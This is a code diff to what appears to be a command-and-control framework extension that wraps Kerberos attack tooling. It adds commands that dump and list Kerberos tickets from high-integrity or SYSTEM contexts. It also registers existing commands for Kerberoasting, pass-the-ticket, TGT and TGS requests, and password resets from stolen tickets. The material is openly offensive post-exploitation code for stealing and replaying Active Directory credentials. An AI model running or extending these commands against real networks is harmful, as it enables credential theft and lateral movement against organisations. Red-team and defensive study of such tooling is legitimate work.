@@ -47,6 +47,12 @@ def krb_describe( demonID, *param ):
 def krb_dump( demonID, *param ):
     return common_task( "DUMP", "dump", demonID, *param)
 
+def krb_dump_high( demonID, *param ):
+    return common_task( "DUMP (high integrity)", "dump", demonID, "/high", *param)
+
+def krb_dump_system( demonID, *param ):
+    return common_task( "DUMP (system)", "dump", demonID, "/system", *param)
+
 def krb_hash( demonID, *param ):
     return common_task( "HASH", "hash", demonID, *param)
 
@@ -55,6 +61,12 @@ def krb_kerberoasting( demonID, *param ):
 
 def krb_klist( demonID, *param ):
     return common_task( "KLIST", "klist", demonID, *param)
+
+def krb_klist_high( demonID, *param ):
+    return common_task( "KLIST (high integrity)", "klist", demonID, "/high", *param)
+
+def krb_klist_system( demonID, *param ):
+    return common_task( "KLIST (system)", "klist", demonID, "/system", *param)
 
 def krb_ptt( demonID, *param ):
     return common_task( "PTT", "ptt", demonID, *param)
@@ -83,10 +95,14 @@ RegisterCommand( krb_asktgt, "", "krb_asktgt", "Retrieve a TGT", 0, "/user:USER 
 RegisterCommand( krb_asktgs, "", "krb_asktgs", "Retrieve a TGS", 0, "/ticket:BASE64 /service:SPN1,SPN2,... [/domain:DOMAIN] [/dc:DC] [/tgs:BASE64] [/targetdomain:DOMAIN] [/targetuser:USER] [/enctype:{rc4|aes256}] [/ptt] [/keylist] [/u2u] [/opsec]", "/service:CIFS/dc.domain.local /ticket:doIF8DCCBey... /opsec" )
 RegisterCommand( krb_changepw, "", "krb_changepw", "Reset a user's password from a supplied TGT", 0, "/ticket:BASE64 /new:PASSWORD [/dc:DC] [/targetuser:USER] [/targetdomain:DOMAIN]", "/new:New_P4ss /ticket:doIF8DCCBey..." )
 RegisterCommand( krb_describe, "", "krb_describe", "Parse and describe a ticket", 0, "/ticket:BASE64", "/ticket:doIF8DCCBey..." )
-RegisterCommand( krb_dump, "", "krb_dump", "Dump tickets", 0, "[/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT]", "" )
+RegisterCommand( krb_dump, "", "krb_dump", "Dump tickets", 0, "[/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT] [/high|/system]", "" )
+RegisterCommand( krb_dump_high, "", "krb_dump_high", "Dump TGTs from a high-integrity process (no SYSTEM) via KerbRetrieveTicketMessage", 0, "[/luid:LOGINID] [/user:USER]", "" )
+RegisterCommand( krb_dump_system, "", "krb_dump_system", "Dump TGTs via the classic SYSTEM (SeTcbPrivilege) path", 0, "[/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT]", "" )
 RegisterCommand( krb_hash, "", "krb_hash", "Calculate rc4_hmac, aes128_cts_hmac_sha1, aes256_cts_hmac_sha1 hashes", 0, "/password:PASSWORD [/user:USER] [/domain:DOMAIN]", "/password:QWErty" )
 RegisterCommand( krb_kerberoasting, "", "krb_kerberoasting", "Perform Kerberoasting", 0, "/spn:SPN [/nopreauth:USER] [/dc:DC] [/domain:DOMAIN]\n                                      /spn:SPN /ticket:BASE64 [/dc:DC]", "/spn:CIFS/COMP.domain.local /ticket:doIF8DCCBey..." )
-RegisterCommand( krb_klist, "", "krb_klist", "List tickets", 0, "[/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT]", "/luid:3ea8" )
+RegisterCommand( krb_klist, "", "krb_klist", "List tickets", 0, "[/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT] [/high|/system]", "/luid:3ea8" )
+RegisterCommand( krb_klist_high, "", "krb_klist_high", "List tickets from a high-integrity process (no SYSTEM)", 0, "[/luid:LOGINID] [/user:USER]", "" )
+RegisterCommand( krb_klist_system, "", "krb_klist_system", "List tickets via the classic SYSTEM (SeTcbPrivilege) path", 0, "[/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT]", "/luid:3ea8" )
 RegisterCommand( krb_ptt, "", "krb_ptt", "Submit a TGT", 0, "/ticket:BASE64 [/luid:LOGONID]", "/ticket:doIF8DCCBey..." )
 RegisterCommand( krb_purge, "", "krb_purge", "Purge tickets", 0, "/ticket:BASE64 [/luid:LOGONID]", "/luid:3ea8" )
 RegisterCommand( krb_renew, "", "krb_renew", "Renew a TGT", 0, "/ticket:BASE64 [/dc:DC] [/ptt]", "/ticket:doIF8DCCBey..." )
